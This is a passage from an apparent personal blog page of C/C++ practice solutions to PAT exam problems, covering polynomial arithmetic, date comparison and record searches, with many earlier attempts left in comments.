class="number">1000</span>;i++)&#123;</span><br><span class="line">        a[i<span class="number">-1</span>]=a[i]*i;</span><br><span class="line">        a[i]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i<span class="number">-1</span>]!=<span class="number">0</span>) cont++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cont==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;0 0&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1000</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,a[i],i);</span><br><span class="line">                cont--;</span><br><span class="line">                <span class="keyword">if</span>(cont!=<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1008</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N=0,M=0;</span></span><br><span class="line"><span class="comment">    int A[200];</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;N,&amp;M);</span></span><br><span class="line"><span class="comment">    M=M%N;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;A[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=N-M;i&lt;N;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d &quot;,A[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;N-M-1;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d &quot;,A[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,A[N-M-1]);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1046</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N;</span></span><br><span class="line"><span class="comment">    int a_drunk=0,b_drunk=0;</span></span><br><span class="line"><span class="comment">    int a_1,a_2,b_1,b_2;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    while(N--)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d%d%d%d&quot;,&amp;a_1,&amp;a_2,&amp;b_1,&amp;b_2);</span></span><br><span class="line"><span class="comment">        if((a_2==(a_1+b_1))&amp;&amp;(b_2!=(a_1+b_1)))</span></span><br><span class="line"><span class="comment">            b_drunk++;</span></span><br><span class="line"><span class="comment">        if((a_2!=(a_1+b_1))&amp;&amp;(b_2==(a_1+b_1)))</span></span><br><span class="line"><span class="comment">            a_drunk++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d %d&quot;,a_drunk,b_drunk);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1026</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int C1,C2;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;C1,&amp;C2);</span></span><br><span class="line"><span class="comment">    int temp=C2-C1;</span></span><br><span class="line"><span class="comment">    if(temp%CLK_TCK&gt;=50)</span></span><br><span class="line"><span class="comment">        temp=temp/CLK_TCK+1;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        temp/=CLK_TCK;</span></span><br><span class="line"><span class="comment">    printf(&quot;%02d:%02d:%02d&quot;,temp/3600,temp%3600/60,temp%60);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1042</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//正在写Bug</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1009</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poly</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span>;</span><br><span class="line">    <span class="keyword">double</span> cof;</span><br><span class="line">&#125;N[<span class="number">1001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum[<span class="number">2001</span>]=&#123;<span class="number">0.0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> K1,K2;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;K1);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K1;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%lf&quot;</span>,&amp;N[i].<span class="built_in">exp</span>,&amp;N[i].cof);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;K2);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K2;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">exp</span>=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> cof=<span class="number">0.0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%lf&quot;</span>,&amp;<span class="built_in">exp</span>,&amp;cof);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;K1;j++)&#123;</span><br><span class="line">            sum[<span class="built_in">exp</span>+N[j].<span class="built_in">exp</span>]+=(cof*N[j].cof);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">2000</span>;i++)</span><br><span class="line">        <span class="keyword">if</span>(sum[i]!=<span class="number">0.0</span>) count++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,count);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2000</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum[i]!=<span class="number">0.0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; %d %.1f&quot;</span>,i,sum[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1002</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int K1,K2;</span></span><br><span class="line"><span class="comment">    double N[1001]=&#123;0.0&#125;;</span></span><br><span class="line"><span class="comment">    double M[1001]=&#123;0.0&#125;;</span></span><br><span class="line"><span class="comment">    int e;</span></span><br><span class="line"><span class="comment">    double c;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;K1);</span></span><br><span class="line"><span class="comment">    while(K1--)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d%lf&quot;,&amp;e,&amp;c);</span></span><br><span class="line"><span class="comment">        N[e]=c;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;K2);</span></span><br><span class="line"><span class="comment">    while(K2--)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d%lf&quot;,&amp;e,&amp;c);</span></span><br><span class="line"><span class="comment">        M[e]=c;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int count=0;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;1001;i++)&#123;</span></span><br><span class="line"><span class="comment">        double sum=0.0;</span></span><br><span class="line"><span class="comment">        sum=N[i]+M[i];</span></span><br><span class="line"><span class="comment">        if(sum!=0) count++;</span></span><br><span class="line"><span class="comment">        N[i]=sum;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,count);</span></span><br><span class="line"><span class="comment">    for(int i=1000;i&gt;=0;i--)&#123;</span></span><br><span class="line"><span class="comment">        if(N[i]!=0)</span></span><br><span class="line"><span class="comment">            printf(&quot; %d %.1f&quot;,i,N[i]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1065</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    long long A,B,C;</span></span><br><span class="line"><span class="comment">    int T=0;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;T);</span></span><br><span class="line"><span class="comment">    int flag[T+1]=&#123;-1&#125;;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=T;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%lld%lld%lld&quot;,&amp;A,&amp;B,&amp;C);</span></span><br><span class="line"><span class="comment">        long long sum=A+B;  //必须用long long 存放后才可与C比较</span></span><br><span class="line"><span class="comment">        if(A&lt;0&amp;&amp;B&lt;0&amp;&amp;sum&gt;=0) flag[i]=0;</span></span><br><span class="line"><span class="comment">        else if(A&gt;0&amp;&amp;B&gt;0&amp;&amp;sum&lt;0) flag[i]=1;</span></span><br><span class="line"><span class="comment">        else if(sum&gt;C)&#123;</span></span><br><span class="line"><span class="comment">            flag[i]=1;</span></span><br><span class="line"><span class="comment">            //printf(&quot;Case #%d: true\n&quot;,i);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            flag[i]=0;</span></span><br><span class="line"><span class="comment">            //printf(&quot;Case #%d: false\n&quot;,i);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=T;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(flag[i]==1) printf(&quot;Case #%d: true\n&quot;,i);</span></span><br><span class="line"><span class="comment">        if(flag[i]==0) printf(&quot;Case #%d: false\n&quot;,i);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1028</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">int</span> year;</span><br><span class="line">    <span class="keyword">int</span> month;</span><br><span class="line">    <span class="keyword">int</span> day;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    person young;</span><br><span class="line">    person old;</span><br><span class="line">    old.year=<span class="number">2014</span>;</span><br><span class="line">    old.month=<span class="number">9</span>;</span><br><span class="line">    old.day=<span class="number">6</span>;</span><br><span class="line">    young.year=<span class="number">1814</span>;</span><br><span class="line">    young.month=<span class="number">9</span>;</span><br><span class="line">    young.day=<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> N=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">int</span> valid=N;</span><br><span class="line">    person town[N];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %d/%d/%d&quot;</span>,&amp;town[i].name,&amp;town[i].year,&amp;town[i].month,&amp;town[i].day);</span><br><span class="line">        <span class="comment">//printf(&quot;%s&quot;,town[i].name);</span></span><br><span class="line">        <span class="keyword">if</span>(town[i].year &gt; <span class="number">2014</span> || (town[i].year == <span class="number">2014</span> &amp;&amp; town[i].month &gt; <span class="number">9</span>) || (town[i].year == <span class="number">2014</span> &amp;&amp; town[i].month == <span class="number">9</span> &amp;&amp; town[i].day &gt; <span class="number">6</span>) || town[i].year &lt; <span class="number">1814</span> || (town[i].year == <span class="number">1814</span> &amp;&amp; town[i].month &lt; <span class="number">9</span>) || (town[i].year == <span class="number">1814</span> &amp;&amp; town[i].month == <span class="number">9</span> &amp;&amp; town[i].day &lt; <span class="number">6</span>))&#123;</span><br><span class="line">            valid--;</span><br><span class="line">            town[i].flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,valid);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;%d&quot;,town[i].flag);</span></span><br><span class="line">        <span class="keyword">if</span>(town[i].flag==<span class="number">1</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(town[i].year &lt; old.year || (town[i].year == old.year &amp;&amp; town[i].month &lt; old.month) || (town[i].year == old.year &amp;&amp; town[i].month == old.month &amp;&amp; town[i].day &lt; old.day))&#123;</span><br><span class="line">                old=town[i];</span><br><span class="line">                <span class="comment">//printf(&quot;%s\n&quot;,old.name);</span></span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(town[i].flag==<span class="number">1</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(town[i].year &gt; young.year || (town[i].year == young.year &amp;&amp; town[i].month &gt; young.month) || (town[i].year == young.year &amp;&amp; town[i].month == young.month &amp;&amp; town[i].day &gt; young.day))&#123;</span><br><span class="line">                young=town[i];</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(valid!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %s %s&quot;</span>,old.name,young.name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1004</span></span><br><span class="line"><span class="comment">struct info&#123;</span></span><br><span class="line"><span class="comment">    char name[11];</span></span><br><span class="line"><span class="comment">    char number[11];</span></span><br><span class="line"><span class="comment">    int score;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);</span></span><br><span class="line"><span class="comment">    info student[n];</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%s%s%d&quot;,&amp;student[i].name,&amp;student[i].number,&amp;student[i].score);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int min=100,max=0;</span></span><br><span class="line"><span class="comment">    int min_num=-1,max_num=-1;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(student[i].score&lt;min)&#123;</span></span><br><span class="line"><span class="comment">            min=student[i].score;</span></span><br><span class="line"><span class="comment">            min_num=i;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        if(student[i].score&gt;max)&#123;</span></span><br><span class="line"><span class="comment">            max=student[i].score;</span></span><br><span class="line"><span class="comment">            max_num=i;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%s %s\n&quot;,student[max_num].name,student[max_num].number);</span></span><br><span class="line"><span class="comment">    printf(&quot;%s %s&quot;,student[min_num].name,student[min_num].number);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1041</span></span><br><span class="line"><span class="comment">struct info&#123;</span></span><br><span class="line"><span class="comment">    char num[17];</span></span><br><span class="line"><span class="comment">    int test;  //formal</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int N=0;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;N);</span></span><br><span class="line"><span class="comment">    info student[N];</span></span><br><span class="line"><span class="comment">    char temp[17];</span></span><br><span class="line"><span class="comment">    int t;</span></span><br><span class="line"><span class="comment">    int f;</span></span><br><span class="line"><span class="comment">    while(N--)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%s%d%d&quot;,&amp;temp,&amp;t,&amp;f);</span></span><br><span class="line"><span class="comment">        student[t-1].test=f;</span></span><br><span class="line"><span class="comment">        sprintf(student[t-1].num,&quot;%s&quot;,temp);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int K=0;</span></span><br><span class="line"><span class="comment">    int a;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;K);</span></span><br><span class="line"><span class="comment">    while(K--)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;a);</span></span><br><span class="line"><span class="comment">        printf(&quot;%s %d\n&quot;,student[a-1].num,student[a-1].test);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1036</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">char</span> id[<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">char</span> gender;</span><br><span class="line">    <span class="keyword">int</span> grade;</span><br><span class="line">&#125;temp,f_max,m_min;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    f_max.grade=<span class="number">-1</span>;</span><br><span class="line">    m_min.grade=<span class="number">101</span>;</span><br><span class="line">    <span class="keyword">int</span> N=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">while</span>(N--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s %c %s %d&quot;</span>,temp.name,&amp;temp.gender,temp.id,&amp;temp.grade);</span><br><span class="line">        <span class="comment">//printf(&quot;%s\n&quot;,temp.name);</span></span><br><span class="line">        <span class="comment">//printf(&quot;%c\n&quot;,temp.gender);</span></span><br><span class="line">        <span class="comment">//printf(&quot;%s\n&quot;,temp.id);</span></span><br><span class="line">        <span class="comment">//printf(&quot;%d\n\n&quot;,temp.grade);</span></span><br><span class="line">        <span class="keyword">if</span>(temp.gender==<span class="string">&#x27;M&#x27;</span>&amp;&amp;temp.grade&lt;m_min.grade) m_min=temp;</span><br><span class="line">        <span class="keyword">if</span>(temp.gender==<span class="string">&#x27;F&#x27;</span>&amp;&amp;temp.grade&gt;f_max.grade) f_max=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(f_max.grade==<span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Absent\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>,f_max.name,f_max.id);</span><br><span class="line">    <span class="keyword">if</span>(m_min.grade==<span class="number">101</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Absent\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>,m_min.name,m_min.id);</span><br><span class="line">    <span class="keyword">if</span>(f_max.grade==<span class="number">-1</span>||m_min.grade==<span class="number">101</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;NA&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,f_max.grade-m_min.grade);</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1006</span></span><br><span class="line"><span class="comment">struct person&#123;</span></span><br><span class="line"><span class="comment">    char name[16];</span></span><br><span class="line"><span class="comment">    int hh,mm,ss;</span></span><br><span class="line"><span class="comment">&#125;temp,late,early;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">bool More(person node1,person node2)&#123;</span></span><br><span class="line"><span class="comment">    if(node1.hh!=node2.hh) return node1.hh&gt;node2.hh;</span></span><br><span class="line"><span class="comment">    if(node1.mm!=node2.mm) return node1.mm&gt;node2.mm;</span></span><br><span class="line"><span class="comment">    return node1.ss&gt;node2.ss;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int M=0;</span></span><br><span class="line"><span class="comment">    early.hh=24,early.mm=60,early.ss=60;</span></span><br><span class="line"><span class="comment">    late.hh=0,late.mm=0,late.ss=0;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;M);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;M;i++)&#123;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%s %d:%d:%d&quot;,temp.name,&amp;temp.hh,&amp;temp.mm,&amp;temp.ss);</span></span><br><span class="line"><span class="comment">        if(More(temp,early)==false) early=temp;</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d:%d:%d&quot;,&amp;temp.hh,&amp;temp.mm,&amp;temp.ss);</span></span><br><span class="line"><span class="comment">        if(More(temp,late)==true) late=temp;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%s %s\n&quot;,early.name,late.name);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT A1011</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    char condition[3]=&#123;&#x27;W&#x27;,&#x27;T&#x27;,&#x27;L&#x27;&#125;;</span></span><br><span class="line"><span class="comment">    double W,T,L;</span></span><br><span class="line"><span class="comment">    double max=0.0;</span></span><br><span class="line"><span class="comment">    double sum=1.0;</span></span><br><span class="line"><span class="comment">    double temp;</span></span><br><span class="line"><span class="comment">    int idx;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;3;i++)&#123;</span></span><br><span class="line"><span class="comment">        max=0.0;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;3;j++)&#123;</span></span><br><span class="line"><span class="comment">            scanf(&quot;%lf&quot;,&amp;temp);</span></span><br><span class="line"><span class="comment">            if(temp&gt;max)&#123;</span></span><br><span class="line"><span class="comment">                max=temp;</span></span><br><span class="line"><span class="comment">                idx=j;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        sum*=max;</span></span><br><span class="line"><span class="comment">        printf(&quot;%c &quot;,condition[idx]);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    